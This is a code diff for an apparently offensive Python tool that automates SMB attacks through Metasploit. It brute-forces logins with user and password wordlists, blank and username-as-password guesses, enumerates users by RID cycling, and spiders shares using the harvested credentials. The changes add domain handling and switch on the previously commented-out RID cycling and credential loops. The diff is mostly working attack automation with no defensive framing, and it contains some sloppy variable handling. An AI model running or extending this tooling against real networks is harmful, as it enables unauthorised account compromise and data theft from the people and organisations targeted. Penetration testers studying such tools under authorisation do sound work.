@@ -50,7 +50,7 @@ def rid_cycling_parse(output, cmd):
     temp_users = []
 
     for line in output.splitlines():
-        if ('DOMAIN' in line) and ('LOCAL' in line):
+        if ('DOMAIN' in line) and ('LOCAL' in line) and (domain == '.'):
             domain = re.findall('LOCAL.*DOMAIN\((.*) -', line)[0]
             printc(f'[+] Domain: {domain}', BLUE)
         if ('USER' in line):
@@ -63,7 +63,7 @@ def rid_cycling_parse(output, cmd):
 
 def bruteforce(target, port):
     global credentials
-    cmd = f'msfconsole -q -x "use scanner/smb/smb_login;set rhosts {target};set RPORT {port};set USER_AS_PASS true;set BLANK_PASSWORDS true;set PASS_FILE $(pwd)/smb_pass.txt; set USER_FILE $(pwd)/smb_users.txt;set VERBOSE false;run;exit;"'
+    cmd = f'msfconsole -q -x "use scanner/smb/smb_login;set rhosts {target};set RPORT {port};set SMBDomain {domain};set USER_AS_PASS true;set BLANK_PASSWORDS true;set PASS_FILE $(pwd)/smb_pass.txt; set USER_FILE $(pwd)/smb_users.txt;set VERBOSE false;run;exit;"'
 
     try:
         output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
@@ -78,15 +78,15 @@ def bruteforce(target, port):
             printc('[+] Creds Found!!!', GREEN)
             print('')
             for line in output.splitlines():
-                creds = re.findall('\[\+\].*Success.*\\\(.*)\'', line)
+                creds = re.findall('\[\+\].*Success.*\\\(.*)\'', line)[0]
                 if (creds.split(':')[1] == ''): continue
                 print(creds)
                 credentials.append(creds)
     export_credentials()
 
 
-def enumerate_shares(target, user, passw, domain):
-    cmd = f'msfconsole -q -x "use scanner/smb/smb_enumshares;set rhosts {target};set LogSpider 0;set MaxDepth 0;set SMBPass {passw};set SMBUser {user};set ShowFiles true;set SpiderShares true;run;exit;"'
+def enumerate_shares(target, user='Guest', passw='', domain='.'):
+    cmd = f'msfconsole -q -x "use scanner/smb/smb_enumshares;set RHOSTS {target};set SMBPass {passw};set SMBUser {user};set SMBDomain {domain};set LogSpider 0;set MaxDepth 0;set ShowFiles true;set SpiderShares true;run;exit;"'
 
     try:
         output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
@@ -95,11 +95,12 @@ def enumerate_shares(target, user, passw, domain):
         return
 
     if output:
-        print_banner('445')
-        print('[!]', cmd)
-        print('[!] Enumerating Shares.')
-        print('')
-        print(output)
+        if ('[+]' in output):
+            print_banner('445')
+            print('[!]', cmd)
+            print('[!] Enumerating Shares.')
+            print('')
+            print(output)
 
     rid_cycling(target, user, passw, domain)
 
@@ -108,16 +109,29 @@ def handle_smb(target, port):
     len_default_users = len(smb_users)
 
     # RID CYCLING NO PASS
-    #rid_cycling(target, user='')
+    rid_cycling(target, user='')
 
-    #if len_default_users == len(smb_users):
-        #rid_cycling(target)
+    if len_default_users == len(smb_users):
+        rid_cycling(target)
 
-    #export_wordlists()
+    export_wordlists()
     # BRUTEFORCE LOGIN
     bruteforce(target, port)
 
+    if (len_default_users == len(smb_users)) and (len(credentials)>0):
+        for cred in credentials:
+            user, passw = cred.split(':')[:2]
+            rid_cycling(target, user, passw, domain)
 
+    # ENUMERATE SHARES
+    enumerate_shares(target)
+
+    enumerate_shares(target, user='')
+
+    if (len(credentials)>0):
+        for cred in credentials:
+            user, passw = cred.split(':')[:2]
+            enumerate_shares(target, user, passw, domain)
 
     try:
         #os.remove('smb_pass.txt')
